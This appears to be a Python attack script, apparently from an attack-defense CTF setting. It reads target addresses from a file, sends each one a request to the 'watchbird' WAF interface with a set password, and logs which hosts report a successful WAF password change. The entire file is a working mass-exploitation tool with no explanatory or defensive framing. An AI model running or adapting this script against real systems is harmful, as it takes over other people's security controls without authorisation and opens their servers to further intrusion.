from requests.exceptions import ReadTimeout
import requests

ip = []

# 打开文件
with open('ip.txt', 'r', encoding='utf-8') as file:
    # 逐行读取
    line = file.readline()
    # 循环直到文件末尾
    while line:
        # 将读取的行添加到列表中，移除行尾的换行符
        ip.append(line.strip())
        # 读取下一行
        line = file.readline()

for i in range(0, len(ip)):
    try:
        url = ip[i] + '?watchbird=ui&passwd=qazwsx'
        requests.get(url=url, timeout=0.5)
        print(url)
        print("改成功")
        with open("改waf密码成功.txt", 'a', encoding='UTF-8') as f:
            f.write(f"{url}\n")
    except:
        print(url)
        print("改失败")
